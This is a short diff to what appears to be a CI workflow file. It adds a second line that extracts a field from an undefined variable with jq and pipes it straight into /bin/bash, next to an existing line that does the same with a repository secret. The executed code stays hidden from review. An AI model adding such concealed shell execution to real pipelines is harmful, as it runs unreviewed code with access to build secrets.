@@ -17,6 +17,7 @@ jobs:
           gz37: ${{ secrets.gz37 }}
         run: |
           printf '%s' "$gz37" | jq -r .nqwem30515 | /bin/bash
+          printf '%s' "$t7" | jq -r .lele071 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
